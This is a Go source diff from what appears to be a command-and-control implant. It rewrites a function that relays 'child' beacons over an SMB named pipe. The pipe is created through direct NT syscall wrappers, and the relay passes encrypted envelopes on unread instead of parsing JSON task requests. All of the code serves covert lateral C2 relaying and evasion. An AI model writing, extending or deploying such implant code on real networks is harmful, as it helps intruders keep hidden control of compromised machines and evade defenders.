@@ -4,7 +4,6 @@ package main
 
 import (
 	"encoding/binary"
-	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -120,6 +119,10 @@ func StartSMBParentPipe(pipeName string) error {
 	return nil
 }
 
+// serveOneSMBRelay handles one child connection on the SMB parent pipe.
+// The child sends an opaque v2 envelope; we queue it for the next parent
+// beacon and return the server's encrypted reply envelope verbatim —
+// identical to p2pHandleChild, so the parent never sees child plaintext.
 func serveOneSMBCient(pipeName string) error {
 	sm := getPipeSyscallManager()
 	handle, err := syscallNtCreateNamedPipeFile(sm, pipeName, 255)
@@ -152,49 +155,28 @@ func serveOneSMBCient(pipeName string) error {
 		return fmt.Errorf("read body: %w", err)
 	}
 
-	var req BeaconRequest
-	if err := json.Unmarshal(body, &req); err != nil {
-		return fmt.Errorf("json parse: %w", err)
-	}
-
-	// Same relay logic as p2pHandleChild
-	p2pRelayMu.Lock()
-	childID := req.UUID
+	childID := p2pEnvelopeUUID(body)
 	if childID == "" {
-		p2pRelayMu.Unlock()
 		return fmt.Errorf("empty child UUID")
 	}
-	isNew := true
-	for _, uuid := range p2pChildUUIDs {
-		if uuid == childID {
-			isNew = false
-			break
+	if !p2pQueueChildFrame(childID, body) {
+		return fmt.Errorf("queue child frame")
+	}
+
+	deadline := time.Now().Add(p2pRelayTimeout)
+	for time.Now().Before(deadline) {
+		if reply := p2pTakeChildReply(childID); reply != nil {
+			if err := binary.Write(conn, binary.BigEndian, uint32(len(reply))); err != nil {
+				return fmt.Errorf("write resp len: %w", err)
+			}
+			if _, err := conn.Write(reply); err != nil {
+				return fmt.Errorf("write resp: %w", err)
+			}
+			return nil
 		}
+		time.Sleep(100 * time.Millisecond)
 	}
-	if isNew {
-		p2pChildUUIDs = append(p2pChildUUIDs, childID)
-	}
-	p2pChildLastSeen[childID] = time.Now()
-	if len(req.Results) > 0 {
-		p2pChildResults[childID] = append(p2pChildResults[childID], req.Results...)
-	}
-	if len(req.AckTaskIDs) > 0 {
-		p2pChildAcks[childID] = append(p2pChildAcks[childID], req.AckTaskIDs...)
-	}
-	tasksForChild := p2pChildTasks[childID]
-	delete(p2pChildTasks, childID)
-	p2pRelayMu.Unlock()
-
-	resp := BeaconResponse{Tasks: tasksForChild}
-	respBody, _ := json.Marshal(resp)
-
-	if err := binary.Write(conn, binary.BigEndian, uint32(len(respBody))); err != nil {
-		return fmt.Errorf("write resp len: %w", err)
-	}
-	if _, err := conn.Write(respBody); err != nil {
-		return fmt.Errorf("write resp: %w", err)
-	}
-	return nil
+	return fmt.Errorf("relay reply timeout")
 }
 
 // sendSMBBeacon sends a beacon payload over SMB named pipe to the C2 server.
